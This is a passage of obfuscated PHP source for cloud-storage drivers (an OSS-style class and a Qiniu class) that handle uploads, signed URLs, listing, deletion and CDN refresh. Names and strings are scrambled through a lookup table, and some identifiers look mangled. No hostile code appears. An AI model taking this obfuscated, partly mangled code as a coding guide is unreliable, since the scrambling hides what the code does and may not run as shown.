get_file_mime(get_path_ext($âÁÍŸÀ¿))); $º–â†›® = $this->trafficLimit($²õÛ£»[1422], $º–â†›®); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($›Œ×ÃˆÁ), $Åğ«üÈÀ, $º–â†›®); } catch (OSS\Core\OssException $İ•ó«Íİ) { return !1; } return $this->getPathOuter($âÁÍŸÀ¿); } public function getHost() { $Œİ¿Ğ§Ü =& $_SERVER[¹òÍ›æş]; $ùÄÈŒ¨ = explode($Œİ¿Ğ§Ü[194], parent::getHost()); return $ùÄÈŒ¨[0] . $Œİ¿Ğ§Ü[194] . $this->bucket . $Œİ¿Ğ§Ü[10] . $ùÄÈŒ¨[1]; } public function uploadFormData($½ª¢šöã, $‘ß´Ç¦¥ = 3600) { $è“Â·Õ‹ =& $_SERVER[¹òÍ›æş]; if (!($€ı¤ÂÙÅ = $this->getHost())) { return !1; } $±¡ÚÓø‰ = $‘ß´Ç¦¥; $Üöñ‡É´ = date($è“Â·Õ‹[1425], time() + $±¡ÚÓø‰); $‹ó¼á = new DateTime($Üöñ‡É´); $úúİ®ˆ = $‹ó¼á->format(DateTime::ISO8601); $…°¸øÎÊ = strpos($úúİ®ˆ, $è“Â·Õ‹[334]); $úúİ®ˆ = substr($úúİ®ˆ, 0, $…°¸øÎÊ) . $è“Â·Õ‹[1426]; $ùÁã’•š = 1048576000 * 5; $°‘£ÌÆ© = $this->pathFather($½ª¢šöã); $÷¹ıŒ®× = array($è“Â·Õ‹[252] => $úúİ®ˆ, $è“Â·Õ‹[255] => array(array($è“Â·Õ‹[1427], 0, $ùÁã’•š), array($è“Â·Õ‹[258], $è“Â·Õ‹[259], $°‘£ÌÆ©))); $á¤Ş¿Üş = base64_encode(json_encode($÷¹ıŒ®×)); $Œ¨µ§©Ò = base64_encode(hash_hmac($è“Â·Õ‹[241], $á¤Ş¿Üş, $this->secret, !0)); $Îú¸Éã‡ = array($è“Â·Õ‹[270] => $á¤Ş¿Üş, $è“Â·Õ‹[1428] => $this->accessKey, $è“Â·Õ‹[262] => $è“Â·Õ‹[251], $è“Â·Õ‹[1429] => $Œ¨µ§©Ò, $è“Â·Õ‹[192] => $€ı¤ÂÙÅ); $Îú¸Éã‡ = $this->trafficLimit($è“Â·Õ‹[1422], $Îú¸Éã‡); return $Îú¸Éã‡; } public function multiUploadFormData($û‰õğ„, $õ©ĞÚ¼ø = 3600) { $‹‰Ó¡Š =& $_SERVER[¹òÍ›æş]; if (!($„×²ØÊ² = $this->getHost())) { return !1; } $şœş¾± = $this->trafficLimit($‹‰Ó¡Š[1422]); $Ü…¾„Ù€ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($û‰õğ„), $şœş¾±); return array($‹‰Ó¡Š[233] => $Ü…¾„Ù€, $‹‰Ó¡Š[192] => $„×²ØÊ² . $‹‰Ó¡Š[8] . $this->pathEncode($û‰õğ„), $‹‰Ó¡Š[234] => gmdate($‹‰Ó¡Š[1430]), $‹‰Ó¡Š[104] => $û‰õğ„); } public function multiUploadAuthData($ÌÕê±¨Á, $ƒ¢¼€Ïş = array()) { $ÜÇî¡¥Ò =& $_SERVER[¹òÍ›æş]; $Ù…î—Íí = isset($ƒ¢¼€Ïş[$ÜÇî¡¥Ò[234]]) ? $ƒ¢¼€Ïş[$ÜÇî¡¥Ò[234]] : gmdate($ÜÇî¡¥Ò[1430]); $®Íœòè = isset($ƒ¢¼€Ïş[$ÜÇî¡¥Ò[184]]) ? $ƒ¢¼€Ïş[$ÜÇî¡¥Ò[184]] : $ÜÇî¡¥Ò[12]; $¬äåş¢ = $ÌÕê±¨Á; if (isset($ƒ¢¼€Ïş[$ÜÇî¡¥Ò[104]])) { $¬äåş¢ = $ƒ¢¼€Ïş[$ÜÇî¡¥Ò[104]]; unset($ƒ¢¼€Ïş[$ÜÇî¡¥Ò[104]]); } if (isset($ƒ¢¼€Ïş[$ÜÇî¡¥Ò[235]])) { $ƒ¢¼€Ïş[$ÜÇî¡¥Ò[234]] = $Ù…î—Íí; return $this->listUploadParts($¬äåş¢, $ƒ¢¼€Ïş); } $é¼ÛïÈĞ = array($ÜÇî¡¥Ò[236], $ÜÇî¡¥Ò[12], $ÜÇî¡¥Ò[130], $Ù…î—Íí, "\170\55\x6f\x73\x73\x2d\x64\x61\x74\145\72{$Ù…î—Íí}", $ÜÇî¡¥Ò[8] . $this->bucket . $ÜÇî¡¥Ò[8] . $¬äåş¢ . $®Íœòè); if (strpos($®Íœòè, $ÜÇî¡¥Ò[237]) === 0) { $é¼ÛïÈĞ[0] = $ÜÇî¡¥Ò[238]; if ($Ñ‹´›îÚ = $this->trafficLimit($ÜÇî¡¥Ò[1422])) { $¬äåş¢ = $ÜÇî¡¥Ò[1431]; array_splice($é¼ÛïÈĞ, 5, 0, $¬äåş¢ . $ÜÇî¡¥Ò[4] . $Ñ‹´›îÚ[$¬äåş¢]); } } if (isset($ƒ¢¼€Ïş[$ÜÇî¡¥Ò[239]]) && $ƒ¢¼€Ïş[$ÜÇî¡¥Ò[239]] == $ÜÇî¡¥Ò[240]) { $é¼ÛïÈĞ[0] = $ÜÇî¡¥Ò[240]; } if (!empty($ƒ¢¼€Ïş[$ÜÇî¡¥Ò[1432]])) { $ğÇûÈ‹› = array_merge(array($é¼ÛïÈĞ[4]), $ƒ¢¼€Ïş[$ÜÇî¡¥Ò[1432]]); sort($ğÇûÈ‹›); $é¼ÛïÈĞ[4] = implode($ÜÇî¡¥Ò[59], $ğÇûÈ‹›); } $¯æüŞÛ„ = implode($ÜÇî¡¥Ò[59], $é¼ÛïÈĞ); $ïÆå·­§ = base64_encode(hash_hmac($ÜÇî¡¥Ò[241], $¯æüŞÛ„, $this->secret, !0)); $§ÈôÄëš = $ÜÇî¡¥Ò[1396] . $this->accessKey . $ÜÇî¡¥Ò[4] . $ïÆå·­§; if (strpos($®Íœòè, $ÜÇî¡¥Ò[237]) === 0) { $§ÈôÄëš = array($ÜÇî¡¥Ò[243] => $§ÈôÄëš, $ÜÇî¡¥Ò[234] => $Ù…î—Íí); if ($Ñ‹´›îÚ) { $§ÈôÄëš = array_merge($§ÈôÄëš, $Ñ‹´›îÚ); } } return $§ÈôÄëš; } public function listUploadParts($ø­üÑá, $øË‘¼Ç“) { $¤®Ô®ë« =& $_SERVER[¹òÍ›æş]; $€¿ğÏÎ = parse_url_query($øË‘¼Ç“[$¤®Ô®ë«[184]]); $âÈÒòà³ = $this->client->listParts($this->bucket, $this->pathEncode($ø­üÑá), $€¿ğÏÎ[$¤®Ô®ë«[233]]); $¾á¢‡ı® = $âÈÒòà³->getListPart(); $¸…¾åˆó = array(); foreach ($¾á¢‡ı® as $“­ç™Ãû) { $¸…¾åˆó[] = array($¤®Ô®ë«[1416] => $“­ç™Ãû->getPartNumber(), $¤®Ô®ë«[1417] => trim($“­ç™Ãû->getETag(), $¤®Ô®ë«[128])); } unset($øË‘¼Ç“[$¤®Ô®ë«[235]], $øË‘¼Ç“[$¤®Ô®ë«[239]]); $å„†—ã = $this->multiUploadAuthData($ø­üÑá, $øË‘¼Ç“); if (empty($å„†—ã)) { return !1; } return array($¤®Ô®ë«[243] => $å„†—ã, $¤®Ô®ë«[234] => $øË‘¼Ç“[$¤®Ô®ë«[234]], $¤®Ô®ë«[245] => $¸…¾åˆó); } public function download($À­ßìØ®, $ôÙöÜŞª) { if ($this->isFolder($À­ßìØ®)) { return !1; } try { $á™ãÂÆ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $ôÙöÜŞª); $á™ãÂÆ = $this->trafficLimit($_SERVER[¹òÍ›æş][119], $á™ãÂÆ); $this->client->getObject($this->bucket, $this->pathEncode($À­ßìØ®), $á™ãÂÆ); } catch (OSS\Core\OssException $©ÂÈ¯¾) { return !1; } return $ôÙöÜŞª; } public function fileSubstr($½ä¶ÄË«, $Ç½ÚÊİÕ = 0, $µ×–Ôç® = false) { if ($Ç½ÚÊİÕ === -1) { $—û ßï“ = array(); } else { if ($µ×–Ôç® === !1) { $Òéá® = $this->size($½ä¶ÄË«); } else { $Òéá® = $Ç½ÚÊİÕ + $µ×–Ôç® - 1; } $—û ßï“ = array(OSS\OssClient::OSS_RANGE => "{$Ç½ÚÊİÕ}\x2d{$Òéá®}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($½ä¶ÄË«), $—û ßï“); } catch (OSS\Core\OssException $ÙôñĞš) { think_exception($ÙôñĞš->getMessage()); return !1; } } private function trafficLimit($øÓøò©ö, $¿±¨²·Å = array()) { $‘Ò½Î§ =& $_SERVER[¹òÍ›æş]; if ($øÓøò©ö == $‘Ò½Î§[1422] && $this->isUploadServer() || $øÓøò©ö == $‘Ò½Î§[119] && $this->isFileOutServer()) { return $¿±¨²·Å; } $èÚÊ¯àË = floatval($GLOBALS[$‘Ò½Î§[6]][$‘Ò½Î§[99]][$‘Ò½Î§[117]][$øÓøò©ö]) * 1024 * 1024 * 8; if (!$èÚÊ¯àË) { return $¿±¨²·Å; } $èÚÊ¯àË = $èÚÊ¯àË < 819200 ? 819200 : ($èÚÊ¯àË > 838860800 ? 838860800 : $èÚÊ¯àË); $¿±¨²·Å[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($èÚÊ¯àË); return $¿±¨²·Å; } public function link($ÀÍŠ™Ñû, $İºÖè´ƒ = array()) { $îÈÍÖ½ =& $_SERVER[¹òÍ›æş]; if (!$this->exist($ÀÍŠ™Ñû) || $this->isFolder($ÀÍŠ™Ñû)) { return !1; } try { $İºÖè´ƒ = $this->trafficLimit($îÈÍÖ½[119], $İºÖè´ƒ); $å•×û… = $this->client->signUrl($this->bucket, $this->pathEncode($ÀÍŠ™Ñû), 3600 * 12, $îÈÍÖ½[240], $İºÖè´ƒ); return $this->getCdnLink($å•×û…); } catch (OSS\Core\OssException $îÚ±Œêš) { return !1; } } public function fileOut($‹Ïô¶Í, $ÜãİÑÄê = false, $ŸÎÇ†¥ = false, $¡÷…’†µ = '') { $ç„Ö¸Ç» =& $_SERVER[¹òÍ›æş]; if ($this->isFileOutServer()) { return $this->fileOutServer($‹Ïô¶Í, $ÜãİÑÄê, $ŸÎÇ†¥, $¡÷…’†µ); } if (!$ŸÎÇ†¥) { $ŸÎÇ†¥ = $this->pathThis($‹Ïô¶Í); } $ŸÎÇ†¥ = rawurlencode($ŸÎÇ†¥); $úÙ¶‚è— = get_file_mime(get_path_ext($ŸÎÇ†¥)); if ($úÙ¶‚è— == $ç„Ö¸Ç»[227]) { return parent::fileOut($‹Ïô¶Í, $ÜãİÑÄê, $ŸÎÇ†¥, $¡÷…’†µ); } $ÜãİÑÄê = $ÜãİÑÄê ? $ç„Ö¸Ç»[1433] : $ç„Ö¸Ç»[1434]; $ÙÈË’õ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ç„Ö¸Ç»[1435] . rawurlencode("{$ÜãİÑÄê}\73\x66\x69\154\145\x6e\141\x6d\x65\75{$ŸÎÇ†¥}")); $ÙÈË’õ[OSS\OssClient::OSS_SUB_RESOURCE] .= $ç„Ö¸Ç»[1436] . rawurlencode($úÙ¶‚è—); $ô«ŸŸ›” = $this->link($‹Ïô¶Í, $ÙÈË’õ); $this->fileOutLink($ô«ŸŸ›”); } public function fileOutServer($«Êˆ†, $Óä ¢Å³ = false, $§Éó©¨… = false, $òÒ†ÖŸ = '') { parent::fileOut($«Êˆ†, $Óä ¢Å³, $§Éó©¨…, $òÒ†ÖŸ); } public function fileOutImage($ˆ°”ß¥æ, $¬Š¨µíì = 250) { if ($this->size($ˆ°”ß¥æ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ˆ°”ß¥æ, $¬Š¨µíì); } $­ê°û¯† = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¹òÍ›æş][1437] . $¬Š¨µíì); $„„îÔŠü = $this->link($ˆ°”ß¥æ, $­ê°û¯†); $this->fileOutLink($„„îÔŠü); } public function fileOutImageServer($‘…µôˆé, $¾ó¬÷Ò… = 250) { parent::fileOutImage($‘…µôˆé, $¾ó¬÷Ò…); } public function fileOutLink($Ø¥ˆıî») { $¬¤íÕ• =& $_SERVER[¹òÍ›æş]; if (!$this->isCdnHost() && substr($Ø¥ˆıî», 0, 7) == $¬¤íÕ•[1358]) { $Ø¥ˆıî» = $¬¤íÕ•[1359] . substr($Ø¥ˆıî», 7); } header($¬¤íÕ•[171] . $Ø¥ˆıî»); die; } public function hashMd5($˜Éú‚æ®, $¶ÃŠ–‰ = '') { $ã¯ÆŒÓ³ =& $_SERVER[¹òÍ›æş]; $ùäô£ÈÂ = $this->_objectMeta($˜Éú‚æ®); if (!$ùäô£ÈÂ) { return $ã¯ÆŒÓ³[12]; } if (!isset($ùäô£ÈÂ[$ã¯ÆŒÓ³[1412]]) && !empty($¶ÃŠ–‰)) { $ìôÍ„… = $this->updateObjMeta($˜Éú‚æ®, array($ã¯ÆŒÓ³[1412] => $¶ÃŠ–‰)); $ùäô£ÈÂ[$ã¯ÆŒÓ³[1412]] = $ìôÍ„… ? $¶ÃŠ–‰ : $ã¯ÆŒÓ³[12]; } return isset($ùäô£ÈÂ[$ã¯ÆŒÓ³[1412]]) ? strtolower($ùäô£ÈÂ[$ã¯ÆŒÓ³[1412]]) : $ã¯ÆŒÓ³[12]; } public function size($Ä‰Œ£¢Ñ) { $»ô½Òá = $this->objectMeta($Ä‰Œ£¢Ñ); return $»ô½Òá ? $»ô½Òá[$_SERVER[¹òÍ›æş][86]] : 0; } public function info($šé›Ã±ğ) { if ($this->isFolder($šé›Ã±ğ)) { return $this->folderInfo($šé›Ã±ğ); } else { if ($this->isFile($šé›Ã±ğ)) { return $this->fileInfo($šé›Ã±ğ); } } return !1; } public function exist($ôÃ‰’ëù) { return $this->isFile($ôÃ‰’ëù) || $this->isFolder($ôÃ‰’ëù); } public function isFile($—ñĞĞ) { return !$this->isFolder($—ñĞĞ) && $this->objectMeta($—ñĞĞ); } public function isFolder($Ò”¸±íé) { return $this->cacheMethod($_SERVER[¹òÍ›æş][175], $Ò”¸±íé); } protected function objectMeta($÷Ú­Ô­) { return $this->cacheMethod($_SERVER[¹òÍ›æş][177], $÷Ú­Ô­); } protected function _objectMeta($½ Š­¸ô) { $§£ÏÏÙî =& $_SERVER[¹òÍ›æş]; try { $›Ğ¶ğÅ— = $this->client->getObjectMeta($this->bucket, $this->pathEncode($½ Š­¸ô)); } catch (OSS\Core\OssException $““Ó¾ò) { $›Ğ¶ğÅ— = !1; } if ($›Ğ¶ğÅ—) { $›Ğ¶ğÅ—[$§£ÏÏÙî[86]] = intval($›Ğ¶ğÅ—[$§£ÏÏÙî[1410]]); } return $›Ğ¶ğÅ—; } protected function _isFolder($àæ€ÒÓ¾) { $ö³şº– =& $_SERVER[¹òÍ›æş]; if ($àæ€ÒÓ¾ == $ö³şº–[12] || $àæ€ÒÓ¾ == $ö³şº–[8]) { return !0; } $­ş®å–Á = array($ö³şº–[1406] => $ö³şº–[8], $ö³şº–[1407] => rtrim($àæ€ÒÓ¾, $ö³şº–[8]) . $ö³şº–[8], $ö³şº–[1408] => 1, $ö³şº–[1409] => $ö³şº–[12]); $º´ä€›Û = $this->client->listObjects($this->bucket, $­ş®å–Á); if ($º´ä€›Û->getObjectList() || $º´ä€›Û->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($—ã“Œåò) { parent::__construct(); require_once SDK_DIR . $_SERVER[¹òÍ›æş][1438]; $this->_init($—ã“Œåò); } public function _init($ó©ÔÎ) { $ÌÃò é =& $_SERVER[¹òÍ›æş]; $this->config = $ó©ÔÎ; foreach ($ó©ÔÎ as $Ø«Ş‰‰š => $»Ò¥¿Ğò) { if (isset($this->{$Ø«Ş‰‰š})) { $this->{$Ø«Ş‰‰š} = $»Ò¥¿Ğò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ÌÃò é[1439] . LNG($ÌÃò é[1397])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($‹å¹¦ØÄ, $Õ½Óşôş = '', $ÎĞ–±ç‡ = REPEAT_RENAME) { if ($this->setContent($‹å¹¦ØÄ, $Õ½Óşôş)) { return $this->getPathOuter($‹å¹¦ØÄ); } return !1; } public function mkdir($¶ÛÓ¯İ, $øıÃ§° = REPEAT_SKIP) { $û¯øù©ç =& $_SERVER[¹òÍ›æş]; $‰ñá¹¼î = trim($¶ÛÓ¯İ, $û¯øù©ç[8]); if ($this->_isFolder($‰ñá¹¼î)) { return $this->getPathOuter($‰ñá¹¼î); } $¶ÛÓ¯İ = $‰ñá¹¼î . $û¯øù©ç[8]; $Ÿ¡üĞ† = get_path_this($‰ñá¹¼î); $›€ïğÔù = $¶ÛÓ¯İ . $Ÿ¡üĞ†; if (!$this->mkfile($›€ïğÔù)) { return !1; } if (!$this->moveFile($›€ïğÔù, $¶ÛÓ¯İ)) { $this->delFile($›€ïğÔù); return !1; } return $this->getPathOuter($‰ñá¹¼î); } public function copyFile($øãÁâÎæ, $•ğ€ÁÈ) { $ö¨ì¶óï = $this->bucketManager->copy($this->bucket, $øãÁâÎæ, $this->bucket, $•ğ€ÁÈ, !0); return $ö¨ì¶óï ? !1 : $this->getPathOuter($•ğ€ÁÈ); } public function moveFile($¶¨ÊÊ–ë, $Îü™) { $ş®¤Ìœ™ = $this->bucketManager->move($this->bucket, $¶¨ÊÊ–ë, $this->bucket, $Îü™, !0); return $ş®¤Ìœ™ ? !1 : $this->getPathOuter($Îü™); } public function delFile($æÉ¦¶ø±) { if (!$this->exist($æÉ¦¶ø±)) { return !0; } $õÅ¼Ø÷¿ = $this->bucketManager->delete($this->bucket, $æÉ¦¶ø±); return $õÅ¼Ø÷¿ ? !1 : !0; } public function delFolder($íÒÃüå) { $é°ìºş =& $_SERVER[¹òÍ›æş]; if (!$this->exist($íÒÃüå)) { return !0; } $this->listItemCache = !1; $œ¯Áë¶ = $this->fileList($íÒÃüå); $this->listItemCache = !0; $«×´È³‹ = trim($íÒÃüå, $é°ìºş[8]) . $é°ìºş[8]; if (!empty($íÒÃüå) && $íÒÃüå !== $é°ìºş[208] && !in_array($«×´È³‹, $œ¯Áë¶[$é°ìºş[92]])) { $œ¯Áë¶[$é°ìºş[92]][] = $«×´È³‹; } $´’ºèø¨ = $this->delByBatch($œ¯Áë¶[$é°ìºş[93]]); if (!$´’ºèø¨) { return !1; } $´’ºèø¨ = $this->delByBatch($œ¯Áë¶[$é°ìºş[92]]); if (!$´’ºèø¨) { return !1; } return $this->delFile($«×´È³‹); } private function delByBatch($ı‚±Àİ) { foreach (array_chunk($ı‚±Àİ, 1000) as $âÉÍÚ¶) { $ù×¹äÊç = $this->bucketManager->buildBatchDelete($this->bucket, $âÉÍÚ¶); list($’§ˆÈÃ­, $ş‚‰”³) = $this->bucketManager->batch($ù×¹äÊç); if ($ş‚‰”³) { return !1; } } return !0; } public function rename($¹³¤§ï³, $À¾åèò) { return $this->renameObject($¹³¤§ï³, $À¾åèò); } public function fileInfo($ï¬‰è†, $ÏŠªõÔ´ = false, $è‘¿“›ç = array()) { $åº¢ÖÕ° =& $_SERVER[¹òÍ›æş]; $ÆìÄÎ¨Ş = array($åº¢ÖÕ°[32] => $this->pathThis($ï¬‰è†), $åº¢ÖÕ°[94] => $this->getPathOuter($åº¢ÖÕ°[8] . $ï¬‰è†), $åº¢ÖÕ°[33] => $åº¢ÖÕ°[210], $åº¢ÖÕ°[86] => isset($è‘¿“›ç[$åº¢ÖÕ°[1440]]) ? $è‘¿“›ç[$åº¢ÖÕ°[1440]] : 0, $åº¢ÖÕ°[184] => $this->ext($ï¬‰è†)); if ($ÏŠªõÔ´) { return $ÆìÄÎ¨Ş; } $ÆìÄÎ¨Ş[$åº¢ÖÕ°[211]] = $ÆìÄÎ¨Ş[$åº¢ÖÕ°[95]] = 0; $ÆìÄÎ¨Ş[$åº¢ÖÕ°[212]] = $ÆìÄÎ¨Ş[$åº¢ÖÕ°[213]] = !0; if (empty($è‘¿“›ç)) { $è‘¿“›ç = $this->objectMeta($ï¬‰è†); if (!$è‘¿“›ç) { return $ÆìÄÎ¨Ş; } } if (isset($è‘¿“›ç[$åº¢ÖÕ°[1441]])) { $ÆìÄÎ¨Ş[$åº¢ÖÕ°[95]] = substr($è‘¿“›ç[$åº¢ÖÕ°[1441]] . $åº¢ÖÕ°[12], 0, 10); } if (isset($è‘¿“›ç[$åº¢ÖÕ°[1440]])) { $ÆìÄÎ¨Ş[$åº¢ÖÕ°[86]] = $è‘¿“›ç[$åº¢ÖÕ°[1440]]; } return $ÆìÄÎ¨Ş; } public function folderInfo($µìªÕöÆ, $‰¼ĞÇŞ = false) { $Ûı‡ÙÁÀ =& $_SERVER[¹òÍ›æş]; $´Íî—Ğ½ = array($Ûı‡ÙÁÀ[32] => $this->pathThis($µìªÕöÆ), $Ûı‡ÙÁÀ[94] => $this->getPathOuter($Ûı‡ÙÁÀ[8] . $µìªÕöÆ), $Ûı‡ÙÁÀ[33] => $Ûı‡ÙÁÀ[85]); if ($‰¼ĞÇŞ) { return $´Íî—Ğ½; } $´Íî—Ğ½[$Ûı‡ÙÁÀ[211]] = $´Íî—Ğ½[$Ûı‡ÙÁÀ[95]] = 0; $´Íî—Ğ½[$Ûı‡ÙÁÀ[212]] = $´Íî—Ğ½[$Ûı‡ÙÁÀ[213]] = !0; $µìªÕöÆ = rtrim($µìªÕöÆ, $Ûı‡ÙÁÀ[8]) . $Ûı‡ÙÁÀ[8]; $­Ğ¦ò«” = $this->objectMeta($µìªÕöÆ); if (isset($­Ğ¦ò«”[$Ûı‡ÙÁÀ[1441]])) { $´Íî—Ğ½[$Ûı‡ÙÁÀ[95]] = substr($­Ğ¦ò«”[$Ûı‡ÙÁÀ[1441]] . $Ûı‡ÙÁÀ[12], 0, 10); } return $´Íî—Ğ½; } public function listPath($¯úÙ¯ç, $¨—Ú¦‡Ÿ = false) { $Øİö¢…³ =& $_SERVER[¹òÍ›æş]; $Äæ â”Ğ = $this->fileList($¯úÙ¯ç, $Øİö¢…³[8], !0); foreach ($Äæ â”Ğ[$Øİö¢…³[92]] as $½ç¶® => $…§ÁêƒÉ) { $Äæ â”Ğ[$Øİö¢…³[92]][$½ç¶®] = $this->folderInfo($…§ÁêƒÉ, $¨—Ú¦‡Ÿ); } foreach ($Äæ â”Ğ[$Øİö¢…³[93]] as $½ç¶® => $…§ÁêƒÉ) { $Äæ â”Ğ[$Øİö¢…³[93]][$½ç¶®] = $this->fileInfo($…§ÁêƒÉ[$Øİö¢…³[104]], $¨—Ú¦‡Ÿ, $…§ÁêƒÉ); } return $Äæ â”Ğ; } public function has($È½›Ÿé•, $À¯½š¬„ = false, $ôÚÁáÁ = true) { $ºãÂËØµ =& $_SERVER[¹òÍ›æş]; $È½›Ÿé• = trim($È½›Ÿé•, $ºãÂËØµ[8]); $ßÊï‚½ª = empty($È½›Ÿé•) && $È½›Ÿé• !== $ºãÂËØµ[208] ? $ºãÂËØµ[12] : $È½›Ÿé• . $ºãÂËØµ[8]; $™Îæ¹Õ­ = $ºãÂËØµ[12]; $Î¥Ò¢¥ó = 500; $ùçı«¢Æ = $ºãÂËØµ[8]; $ÌÔ£œÆÄ = $Ú—ŸíáÛ = 0; while (!0) { check_abort(); list($Ö—‡µÚº, $ğÇ·ˆôò) = $this->bucketManager->listFiles($this->bucket, $ßÊï‚½ª, $™Îæ¹Õ­, $Î¥Ò¢¥ó, $ùçı«¢Æ); if ($ğÇ·ˆôò) { break; } $™Îæ¹Õ­ = array_key_exists($ºãÂËØµ[1409], $Ö—‡µÚº) ? $™Îæ¹Õ­ = $Ö—‡µÚº[$ºãÂËØµ[1442]] : $ºãÂËØµ[12]; if ($À¯½š¬„) { if (!empty($Ö—‡µÚº[$ºãÂËØµ[1443]])) { $ÌÔ£œÆÄ += count($Ö—‡µÚº[$ºãÂËØµ[1443]]); } if (!empty($Ö—‡µÚº[$ºãÂËØµ[1444]])) { $Ú—ŸíáÛ += count($Ö—‡µÚº[$ºãÂËØµ[1444]]); } if ($™Îæ¹Õ­ === $ºãÂËØµ[12]) { break; } continue; } if ($ôÚÁáÁ) { if (!empty($Ö—‡µÚº[$ºãÂËØµ[1443]])) { return !0; } } else { if (!empty($Ö—‡µÚº[$ºãÂËØµ[1444]])) { return !0; } } if ($™Îæ¹Õ­ === $ºãÂËØµ[12]) { break; } } if ($À¯½š¬„) { return array($ºãÂËØµ[217] => $ÌÔ£œÆÄ, $ºãÂËØµ[218] => $Ú—ŸíáÛ); } return !1; } public function listAll($ÏËÈ›÷å) { $šÒó¹Òì =& $_SERVER[¹òÍ›æş]; $Ğõ¿¾ = $this->fileList($ÏËÈ›÷å, $šÒó¹Òì[12], !0); $¡ô…Şçè = array_to_keyvalue($Ğõ¿¾[$šÒó¹Òì[93]], $šÒó¹Òì[32]); foreach ($Ğõ¿¾[$šÒó¹Òì[92]] as $Ã×ûšß¸) { if (is_string($Ã×ûšß¸)) { $¡ô…Şçè[$Ã×ûšß¸] = array($šÒó¹Òì[86] => 0); } } return $this->listAllFiles($ÏËÈ›÷å, $¡ô…Şçè); } private function fileList($á„Ü÷èû, $Ò®Õõ­ä = '', $ñû¼ÇğÄ = 0) { $şğœÉ‡ç =& $_SERVER[¹òÍ›æş]; $á„Ü÷èû = trim($á„Ü÷èû, $şğœÉ‡ç[8]); $ÕÂŞ°°ä = empty($á„Ü÷èû) && $á„Ü÷èû !== $şğœÉ‡ç[208] ? $şğœÉ‡ç[12] : $á„Ü÷èû . $şğœÉ‡ç[8]; $ÎÖŠîĞ = $şğœÉ‡ç[12]; $š®Ÿ¨Å¾ = 1000; $ÁşŒ©„¬ = $‡×ñõş† = array(); while (!0) { check_abort(); list($–Ì¨á¸É, $èÜ­¦Óü) = $this->bucketManager->listFiles($this->bucket, $ÕÂŞ°°ä, $ÎÖŠîĞ, $š®Ÿ¨Å¾, $Ò®Õõ­ä); if ($èÜ­¦Óü) { break; } $ÎÖŠîĞ = array_key_exists($şğœÉ‡ç[1409], $–Ì¨á¸É) ? $ÎÖŠîĞ = $–Ì¨á¸É[$şğœÉ‡ç[1442]] : $şğœÉ‡ç[12]; $‡œµè¿ = isset($–Ì¨á¸É[$şğœÉ‡ç[1443]]) ? $–Ì¨á¸É[$şğœÉ‡ç[1443]] : array(); $ıÔÏ«³­ = isset($–Ì¨á¸É[$şğœÉ‡ç[1444]]) ? $–Ì¨á¸É[$şğœÉ‡ç[1444]] : array(); foreach ($‡œµè¿ as $ËÉàĞŒœ) { if ($ËÉàĞŒœ[$şğœÉ‡ç[104]] == $ÕÂŞ°°ä) { continue; } $°˜¬úÆ‡ = $ËÉàĞŒœ[$şğœÉ‡ç[104]]; $ƒú‘üî¦ = $ËÉàĞŒœ[$şğœÉ‡ç[1440]]; $ËÉàĞŒœ[$şğœÉ‡ç[86]] = $ƒú‘üî¦; $¥¯š’Û¤ = $ƒú‘üî¦ == 0 && substr($°˜¬úÆ‡, strlen($°˜¬úÆ‡) - 1, 1) == $şğœÉ‡ç[8] ? !0 : !1; $this->cacheMethodInfoSet($°˜¬úÆ‡, $¥¯š’Û¤, $ËÉàĞŒœ); if ($¥¯š’Û¤) { $ÁşŒ©„¬[] = $°˜¬úÆ‡; continue; } $‡×ñõş†[] = $ñû¼ÇğÄ ? $ËÉàĞŒœ : $°˜¬úÆ‡; } foreach ($ıÔÏ«³­ as $°˜¬úÆ‡) { if ($°˜¬úÆ‡ == $ÕÂŞ°°ä) { continue; } $ÁşŒ©„¬[] = $°˜¬úÆ‡; $this->cacheMethodInfoSet($°˜¬úÆ‡, !0); } if ($ÎÖŠîĞ === $şğœÉ‡ç[12]) { break; } } $this->cacheMethodInfoSet($á„Ü÷èû, !0); return array($şğœÉ‡ç[92] => $ÁşŒ©„¬, $şğœÉ‡ç[93] => $‡×ñõş†); } public function canRead($£‡Ç®×) { return $this->exist($£‡Ç®×) ? !0 : !1; } public function canWrite($´±ç“ê²) { return $this->exist($´±ç“ê²) ? !0 : !1; } public function getContent($×åÌş´ ) { return $this->fileSubstr($×åÌş´ , 0, -1); } public function setContent($ÕİÛ °‚, $×ˆî’Ø = '') { $º³ŸŸ©… = $this->tempFile($this->pathThis($ÕİÛ °‚)); file_put_contents($º³ŸŸ©…, $×ˆî’Ø); if ($this->upload($ÕİÛ °‚, $º³ŸŸ©…)) { $this->tempFileRemve($º³ŸŸ©…); return !0; } return !1; } public function refreshUrls($¹¸–ÍÒ½) { $¾Ô·„•ò =& $_SERVER[¹òÍ›æş]; $½…‰Ñ¯ê = array(); if (is_array($¹¸–ÍÒ½)) { foreach ($¹¸–ÍÒ½ as $†´»åı‹) { $½…‰Ñ¯ê[] = $this->link($†´»åı‹); } } else { $½…‰Ñ¯ê[] = $this->link($¹¸–ÍÒ½); } $Œ–ûö = new Qiniu\Cdn\CdnManager($this->auth); list($©‚Ş÷²Ì, $‘Ğšçç) = $Œ–ûö->refreshUrls($½…‰Ñ¯ê); if ($‘Ğšçç) { return !1; } return $©‚Ş÷²Ì[$¾Ô·„•ò[1209]] == $¾Ô·„•ò[789] ? !0 : !1; } public function fileSubstr($í‰şîÉ¸, $ú’âÊ¥˜, $Ó™öà´Ó) { $‘¶Æ®¢ =& 